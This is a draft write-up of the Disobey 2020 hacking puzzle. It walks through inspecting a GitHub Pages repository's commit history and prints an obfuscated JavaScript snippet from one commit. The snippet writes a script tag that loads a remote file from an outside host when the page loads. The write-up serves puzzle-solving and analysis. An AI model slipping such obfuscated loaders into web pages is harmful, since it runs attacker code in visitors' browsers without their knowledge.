---
title: "Disobey Puzzle 2020 - writeup"
date: 2019-08-03T16:32:40+03:00
draft: true
toc: false
images:
tags:
  - disobey
---

This year's Disobey puzzle started with a website, which is hosted via Github pages. This means that other than the website itself can be considered out-of-scope. Recon phase is pretty quick, since you can get the whole site's source code straight from [Github](https://github.com/disobey2020/disobey2020.github.io). With a quick glance you can see that the webiste is pretty simple, and doesn't include anything interesting **at it's current state**.

![Github Repository](/images/disobey_puzzle2020/Github_repo.png)

Github is a interesting place. In this puzzle, it is crucial to check out everything that is available, especially the commit history.

![Commit history](/images/disobey_puzzle2020/commit_history.png)

From here you can see commit `0ac77ce...` and how it included some malicious stuff, and how the malicious code was removed in commit `4517bd0...`. There also is a [closed issue](https://github.com/disobey2020/disobey2020.github.io/issues/2), but that could just be an easter egg. Let's remember this, just in case. But for now, let's focus on the commit `0ac77ce`, where there was some malicious code.

```javascript
 var _0x4311=['.fi','/ma','l.js','write','<script\x20src=\x22','s://','0x42'];(function(_0x426e03,_0x359476){var _0x17c635=function(_0x5dfa16){while(--_0x5dfa16){_0x426e03['push'](_0x426e03['shift']());}};_0x17c635(++_0x359476);}(_0x4311,0x9f));var _0x5a74=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4311[_0x2d8f05];return _0x4d74cb;};var f1='hT';var f2='tP';var f3=_0x5a74('0x0');var f4=_0x5a74('0x1');var f5=_0x5a74('0x2');var f6=_0x5a74('0x3');var f7=_0x5a74('0x4');document[_0x5a74('0x5')](_0x5a74('0x6')+f1+f2+f3+f4+f5+f6+f7+'\x22><\/script>');
 ```

 The code is obfuscated, but can easily be formed to readable form, via your favorite js beatifier.